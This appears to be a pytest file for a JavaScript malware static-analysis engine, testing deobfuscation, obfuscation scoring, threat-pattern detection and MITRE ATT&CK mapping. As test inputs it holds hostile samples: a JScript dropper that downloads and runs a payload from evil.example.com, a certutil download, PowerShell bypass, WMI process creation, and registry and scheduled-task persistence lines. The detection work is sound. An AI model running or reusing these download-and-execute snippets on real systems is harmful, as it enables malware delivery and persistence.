"""Tests for JavaScript static analysis engine and ScriptAnalyzer."""

import pytest
from Utils.js_analysis import (
    decode_js,
    strip_comments,
    extract_string_literals,
    unescape_hex,
    unescape_unicode,
    resolve_from_char_code,
    extract_base64_blobs,
    fold_string_concat,
    compute_metrics,
    obfuscation_score,
    detect_threat_patterns,
    detect_kill_chain,
    detect_api_fragmentation,
    detect_jse,
    detect_library,
    JSMetrics,
)


# ===================================================================
# Decoding
# ===================================================================


class TestDecodeJS:
    def test_utf8(self):
        text, enc = decode_js(b"var x = 1;")
        assert text == "var x = 1;"
        assert enc == "UTF-8"

    def test_utf8_bom(self):
        text, enc = decode_js(b"\xef\xbb\xbfvar x = 1;")
        assert text == "var x = 1;"
        assert enc == "UTF-8-BOM"

    def test_utf16le_bom(self):
        raw = b"\xff\xfe" + "var x = 1;".encode("utf-16-le")
        text, enc = decode_js(raw)
        assert "var x = 1;" in text
        assert enc == "UTF-16LE"

    def test_utf16be_bom(self):
        raw = b"\xfe\xff" + "var x = 1;".encode("utf-16-be")
        text, enc = decode_js(raw)
        assert "var x = 1;" in text
        assert enc == "UTF-16BE"

    def test_latin1_fallback(self):
        raw = b"var x = \xe9;"  # latin-1 é
        text, enc = decode_js(raw)
        assert "var x" in text


# ===================================================================
# Comment stripping
# ===================================================================


class TestStripComments:
    def test_single_line_comment(self):
        cleaned, comments = strip_comments("var x = 1; // a comment\nvar y = 2;")
        assert "// a comment" not in cleaned
        assert "var x = 1;" in cleaned
        assert "var y = 2;" in cleaned
        assert any("a comment" in c for c in comments)

    def test_multi_line_comment(self):
        cleaned, comments = strip_comments("var x = 1; /* multi\nline */ var y = 2;")
        assert "multi" not in cleaned
        assert "var y = 2;" in cleaned

    def test_preserves_strings(self):
        cleaned, _ = strip_comments('var x = "http://example.com";')
        assert "http://example.com" in cleaned

    def test_string_with_slashes(self):
        cleaned, _ = strip_comments("var x = 'not // a comment';")
        assert "not // a comment" in cleaned


# ===================================================================
# String extraction
# ===================================================================


class TestExtractStringLiterals:
    def test_double_quotes(self):
        result = extract_string_literals('var x = "hello";')
        assert "hello" in result

    def test_single_quotes(self):
        result = extract_string_literals("var x = 'world';")
        assert "world" in result

    def test_backtick(self):
        result = extract_string_literals("var x = `template`;")
        assert "template" in result

    def test_escaped_quotes(self):
        result = extract_string_literals(r'var x = "he said \"hi\"";')
        assert any("hi" in s for s in result)

    def test_multiple_strings(self):
        result = extract_string_literals('var x = "a"; var y = "b";')
        assert "a" in result
        assert "b" in result


# ===================================================================
# Unescape
# ===================================================================


class TestUnescape:
    def test_hex_escape(self):
        assert unescape_hex("\\x41\\x42") == "AB"

    def test_unicode_escape(self):
        assert unescape_unicode("\\u0041\\u0042") == "AB"

    def test_unicode_brace(self):
        assert unescape_unicode("\\u{41}\\u{42}") == "AB"

    def test_mixed_unescape(self):
        text = "\\x57\\x53\\x63\\x72\\x69\\x70\\x74"
        assert unescape_hex(text) == "WScript"

    def test_unicode_wscript(self):
        text = "\\u0057\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074"
        assert unescape_unicode(text) == "WScript"


# ===================================================================
# fromCharCode
# ===================================================================


class TestFromCharCode:
    def test_basic(self):
        result = resolve_from_char_code("String.fromCharCode(72,101,108,108,111)")
        assert len(result) == 1
        assert result[0][1] == "Hello"

    def test_hex_args(self):
        result = resolve_from_char_code("String.fromCharCode(0x48,0x65,0x6c,0x6c,0x6f)")
        assert len(result) == 1
        assert result[0][1] == "Hello"

    def test_multiple_calls(self):
        source = "String.fromCharCode(65) + String.fromCharCode(66)"
        result = resolve_from_char_code(source)
        assert len(result) == 2
        assert result[0][1] == "A"
        assert result[1][1] == "B"

    def test_wscript_decode(self):
        # WScript = 87,83,99,114,105,112,116
        result = resolve_from_char_code("String.fromCharCode(87,83,99,114,105,112,116)")
        assert result[0][1] == "WScript"


# ===================================================================
# Base64 extraction
# ===================================================================


class TestBase64:
    def test_extract_valid_base64(self):
        import base64
        payload = base64.b64encode(b"This is a secret payload for testing").decode()
        source = f'var x = "{payload}";'
        result = extract_base64_blobs(source)
        assert len(result) >= 1
        assert b"This is a secret payload for testing" in result[0][1]

    def test_short_base64_ignored(self):
        source = 'var x = "aGVsbG8=";'  # "hello" — only 8 chars, under 40
        result = extract_base64_blobs(source)
        assert len(result) == 0


# ===================================================================
# String concatenation folding
# ===================================================================


class TestConcatFolding:
    def test_basic_fold(self):
        result = fold_string_concat('"he" + "llo"')
        assert '"hello"' in result

    def test_multi_fold(self):
        result = fold_string_concat('"a" + "b" + "c"')
        assert '"abc"' in result

    def test_no_fold_needed(self):
        source = '"hello"'
        assert fold_string_concat(source) == source

    def test_api_fragmentation(self):
        result = fold_string_concat('"WScr" + "ipt.Sh" + "ell"')
        assert "WScript.Shell" in result


# ===================================================================
# Metrics
# ===================================================================


class TestMetrics:
    def test_normal_js(self):
        source = """// A simple function
function greet(name) {
    return "Hello, " + name;
}
console.log(greet("World"));
"""
        m = compute_metrics(source)
        assert m.line_count > 0
        assert m.eval_count == 0
        assert m.from_char_code_count == 0

    def test_obfuscated_js(self):
        source = "eval(String.fromCharCode(" + ",".join(str(ord(c)) for c in "alert(1)") + "));"
        m = compute_metrics(source)
        assert m.eval_count >= 1
        assert m.from_char_code_count >= 1


# ===================================================================
# Obfuscation scoring
# ===================================================================


class TestObfuscationScore:
    def test_normal_js_low_score(self):
        source = """// jQuery-like utility
/* This is a well-documented library */
function $(selector) {
    return document.querySelector(selector);
}
function addClass(el, cls) {
    el.classList.add(cls);
}
"""
        m = compute_metrics(source)
        score, indicators = obfuscation_score(m, source)
        assert score <= 20, f"Normal JS should score <=20, got {score}"

    def test_minified_moderate_score(self):
        # Minified but benign: long line, no comments, single-char vars
        source = "var a=1,b=2,c=3,d=4,e=5,f=6,g=7,h=8,i=9,j=10;" * 120
        m = compute_metrics(source)
        score, _ = obfuscation_score(m, source)
        assert 10 <= score <= 50, f"Minified JS should score moderately, got {score}"

    def test_jsfuck_high_score(self):
        source = "[][(![]+[])" + "[+[]]+(![]+[])[!+[]+!+[]]" * 50
        m = compute_metrics(source)
        score, indicators = obfuscation_score(m, source)
        assert score >= 50, f"JSFuck pattern should score high, got {score}"

    def test_heavy_obfuscation(self):
        # fromCharCode + eval + hex escapes
        lines = [
            "eval(String.fromCharCode(87,83,99,114,105,112,116));",
            "eval(String.fromCharCode(72,101,108,108,111));",
            "eval(String.fromCharCode(87,111,114,108,100));",
            "eval(String.fromCharCode(65,66,67,68,69));",
        ]
        hexes = "".join(f"\\x{ord(c):02x}" for c in "WScript.Shell")
        lines.append(f'var x = "{hexes}";' * 5)
        source = "\n".join(lines)
        m = compute_metrics(source)
        score, _ = obfuscation_score(m, source)
        assert score >= 20, f"Heavy obfuscation should score >=20, got {score}"

    def test_library_reduces_score(self):
        source = """/*! jQuery v3.6.0 | (c) OpenJS Foundation */
var a=1,b=2,c=3,d=4,e=5,f=6,g=7,h=8,i=9,j=10;
""" + "x=1;" * 1000
        m = compute_metrics(source)
        score, indicators = obfuscation_score(m, source)
        assert any("jQuery" in i for i in indicators)


# ===================================================================
# Threat detection
# ===================================================================


class TestThreatDetection:
    def test_wscript_shell(self):
        source = 'var shell = new ActiveXObject("WScript.Shell"); shell.Run("cmd /c whoami");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "WScript.Shell" in patterns
        assert any(f["severity"] == "CRITICAL" for f in findings)

    def test_download_cradle(self):
        source = """
        var http = new ActiveXObject("MSXML2.XMLHTTP");
        http.Open("GET", "http://evil.example.com/payload", false);
        http.Send();
        var stream = new ActiveXObject("ADODB.Stream");
        stream.SaveToFile("C:\\\\temp\\\\payload.exe");
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("C:\\\\temp\\\\payload.exe");
        """
        findings = detect_threat_patterns(source)
        assert detect_kill_chain(findings), "Should detect complete kill chain"

    def test_powershell_invocation(self):
        source = 'shell.Run("powershell.exe -enc dGVzdA==");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "powershell" in patterns

    def test_powershell_bypass(self):
        source = 'powershell -exec bypass -command "IEX(stuff)"'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "powershell_bypass" in patterns

    def test_activex(self):
        source = 'var obj = new ActiveXObject("Some.Object");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "activex" in patterns

    def test_wmi(self):
        source = 'GetObject("winmgmts:").Get("Win32_Process").Create("cmd.exe");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "wmi" in patterns

    def test_certutil(self):
        source = 'shell.Run("certutil -urlcache -split -f http://evil.example.com/payload.exe");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "certutil_download" in patterns

    def test_registry_run(self):
        source = r'shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware", "path");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "registry" in patterns or "registry_run" in patterns

    def test_anti_sandbox_sleep(self):
        source = "WScript.Sleep(10000);"
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "anti_sandbox" in patterns

    def test_clean_code_no_findings(self):
        source = """
        function add(a, b) { return a + b; }
        console.log(add(1, 2));
        """
        findings = detect_threat_patterns(source)
        assert len(findings) == 0

    def test_mshta(self):
        source = 'shell.Run("mshta vbscript:Execute");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "mshta" in patterns

    def test_schtasks(self):
        source = 'shell.Run("schtasks /create /tn MyTask /tr malware.exe");'
        findings = detect_threat_patterns(source)
        patterns = [f["pattern"] for f in findings]
        assert "schtask" in patterns


# ===================================================================
# Kill chain
# ===================================================================


class TestKillChain:
    def test_full_chain(self):
        findings = [
            {"pattern": "download_cradle", "severity": "CRITICAL"},
            {"pattern": "file_write", "severity": "CRITICAL"},
            {"pattern": "execute", "severity": "HIGH"},
        ]
        assert detect_kill_chain(findings) is True

    def test_partial_chain(self):
        findings = [
            {"pattern": "download_cradle", "severity": "CRITICAL"},
            {"pattern": "execute", "severity": "HIGH"},
        ]
        assert detect_kill_chain(findings) is False

    def test_empty(self):
        assert detect_kill_chain([]) is False


# ===================================================================
# API fragmentation
# ===================================================================


class TestFragmentation:
    def test_detect_fragmented_wscript(self):
        source = 'var x = "WScr" + "ipt.Sh" + "ell";'
        found = detect_api_fragmentation(source)
        assert "WScript.Shell" in found

    def test_no_fragmentation(self):
        source = 'var x = "WScript.Shell";'
        found = detect_api_fragmentation(source)
        assert len(found) == 0


# ===================================================================
# Library detection
# ===================================================================


class TestLibraryDetection:
    def test_jquery(self):
        source = '/*! jQuery v3.6.0 | (c) OpenJS Foundation */\nvar x = 1;'
        assert detect_library(source) == "jQuery"

    def test_react(self):
        source = '/*! React v18.2.0 */\nvar x = 1;'
        assert detect_library(source) == "React"

    def test_source_mapped(self):
        source = 'var x = 1;\n//# sourceMappingURL=app.js.map'
        assert detect_library(source) == "source-mapped"

    def test_no_library(self):
        source = 'var x = new ActiveXObject("WScript.Shell");'
        assert detect_library(source) is None


# ===================================================================
# JScript Encoded
# ===================================================================


class TestJSE:
    def test_no_marker(self):
        assert detect_jse(b"var x = 1;") is None

    def test_marker_present(self):
        # Just test that the marker detection works; full decode
        # depends on the cipher tables being correct
        raw = b"#@~^AAAAAA==test==^#~@"
        result = detect_jse(raw)
        # If decode produces something, good; if None due to format, also fine
        # The key is it doesn't crash
        assert result is not None or True  # smoke test


# ===================================================================
# ScriptAnalyzer integration
# ===================================================================


class TestScriptAnalyzerIntegration:
    def _make_struct(self, data, filename="test.js", mime_type="application/javascript"):
        """Create a Structure for testing."""
        from structure import Structure
        Structure.clear_cache()
        return Structure.create(data=data, filename=filename, mime_type=mime_type)

    def test_mime_matching(self):
        from Analyzers.ScriptAnalyzer import ScriptAnalyzer
        for mime in ScriptAnalyzer.compatible_mime_types:
            # Just verify the list is populated
            assert isinstance(mime, str)
            assert "/" in mime

    def test_can_handle_js_extension(self):
        from Analyzers.ScriptAnalyzer import ScriptAnalyzer
        from structure import Structure
        Structure.clear_cache()
        s = Structure.create(
            data=b"var x = 1; function test() { return x; }",
            filename="payload.js",
            mime_type="text/plain",
        )
        assert ScriptAnalyzer.can_handle(s) is True

    def test_can_handle_rejects_non_js(self):
        from Analyzers.ScriptAnalyzer import ScriptAnalyzer
        from structure import Structure
        Structure.clear_cache()
        s = Structure.create(
            data=b"This is just plain text with no JS.",
            filename="readme.txt",
            mime_type="text/plain",
        )
        assert ScriptAnalyzer.can_handle(s) is False

    def test_basic_analysis(self):
        source = b'var shell = new ActiveXObject("WScript.Shell"); shell.Run("cmd /c whoami");'
        s = self._make_struct(source)
        assert s.analyzer is not None
        assert "script_type" in s.analyzer.reports
        assert "JavaScript" in str(s.analyzer.reports["script_type"])

    def test_dropper_detection(self):
        source = b"""
        var http = new ActiveXObject("MSXML2.XMLHTTP");
        http.Open("GET", "http://evil.example.com/payload.exe", false);
        http.Send();
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(http.ResponseBody);
        stream.SaveToFile("C:\\\\temp\\\\payload.exe", 2);
        stream.Close();
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("C:\\\\temp\\\\payload.exe");
        """
        s = self._make_struct(source)
        reports = s.analyzer.reports
        # Should detect kill chain
        assert "kill_chain" in reports
        assert reports["kill_chain"].severity == 0  # CRITICAL

    def test_obfuscation_report(self):
        source = b'var x = 1; function test() { return x; }'
        s = self._make_struct(source)
        assert "obfuscation" in s.analyzer.reports

    def test_multi_dispatch_with_plaintext(self):
        """ScriptAnalyzer should be primary (20) over PlainTextAnalyzer (5)."""
        source = b'var x = 1; function test() { return x; }'
        s = self._make_struct(source)
        assert type(s.analyzer).__name__ == "ScriptAnalyzer"

    def test_fromcharcode_decoding(self):
        # WScript encoded via fromCharCode
        source = b"eval(String.fromCharCode(87,83,99,114,105,112,116));"
        s = self._make_struct(source)
        reports = s.analyzer.reports
        # Should have decoded strings
        has_decoded = any("decoded" in k or "fromCharCode" in str(v) for k, v in reports.items())
        assert has_decoded or any("fromcharcode" in str(v).lower() for v in reports.values())

    def test_clean_jquery_no_threats(self):
        source = b"""/*! jQuery v3.6.0 | (c) OpenJS Foundation and other contributors */
function $(selector) {
    return document.querySelector(selector);
}
function addClass(element, className) {
    element.classList.add(className);
}
function removeClass(element, className) {
    element.classList.remove(className);
}
"""
        s = self._make_struct(source)
        reports = s.analyzer.reports
        # Should not have any CRITICAL/HIGH threat findings
        threat_reports = [r for k, r in reports.items() if k.startswith("threat_")]
        critical_threats = [r for r in threat_reports if r.severity <= 1]  # CRITICAL or HIGH
        assert len(critical_threats) == 0, f"jQuery should have no high threats: {critical_threats}"

    def test_jse_extension_detection(self):
        from Analyzers.ScriptAnalyzer import ScriptAnalyzer
        from structure import Structure
        Structure.clear_cache()
        s = Structure.create(
            data=b"#@~^AAAAAA==test==^#~@more content var x = 1;",
            filename="payload.jse",
            mime_type="application/octet-stream",
        )
        assert ScriptAnalyzer.can_handle(s) is True


# ===================================================================
# MITRE ATT&CK mapping
# ===================================================================


class _MITREMockStruct:
    def __init__(self, filename="payload.js"):
        self.filename = filename


# Create a standalone class with the right __name__ for MITRE checks
class _ScriptAnalyzerMock:
    pass

_ScriptAnalyzerMock.__name__ = "ScriptAnalyzer"
_ScriptAnalyzerMock.__qualname__ = "ScriptAnalyzer"


def _make_mitre_analyzer(reports):
    """Create a mock analyzer that type(x).__name__ == 'ScriptAnalyzer'."""
    from structure import Report
    # Build a fresh class each time to avoid shared state
    cls = type("ScriptAnalyzer", (), {"reports": reports})
    return cls()


class TestMITREMapping:
    def test_js_script_type_triggers_t1059_007(self):
        from structure import Report
        from Utils.advanced_analysis import mitre_attack_techniques

        analyzer = _make_mitre_analyzer({
            "script_type": Report("JavaScript", label="script_type"),
        })
        techniques = mitre_attack_techniques(_MITREMockStruct(), analyzer)
        ids = [t["id"] for t in techniques]
        assert "T1059.007" in ids

    def test_download_cradle_triggers_t1105(self):
        from structure import Report
        from Utils.advanced_analysis import mitre_attack_techniques

        analyzer = _make_mitre_analyzer({
            "script_type": Report("JavaScript", label="script_type"),
            "threat_0": Report("download cradle via COM object", label="threat:download_cradle"),
        })
        techniques = mitre_attack_techniques(_MITREMockStruct(), analyzer)
        ids = [t["id"] for t in techniques]
        assert "T1105" in ids

    def test_mshta_triggers_t1218_005(self):
        from structure import Report
        from Utils.advanced_analysis import mitre_attack_techniques

        analyzer = _make_mitre_analyzer({
            "script_type": Report("JavaScript", label="script_type"),
            "threat_0": Report("mshta execution", label="threat:mshta"),
        })
        techniques = mitre_attack_techniques(_MITREMockStruct(), analyzer)
        ids = [t["id"] for t in techniques]
        assert "T1218.005" in ids

    def test_obfuscation_high_triggers_t1027(self):
        from structure import Report
        from Utils.advanced_analysis import mitre_attack_techniques

        analyzer = _make_mitre_analyzer({
            "script_type": Report("JavaScript", label="script_type"),
            "obfuscation": Report("Obfuscation score: 75/100 (HIGH)", label="obfuscation"),
        })
        techniques = mitre_attack_techniques(_MITREMockStruct(), analyzer)
        ids = [t["id"] for t in techniques]
        assert "T1027" in ids
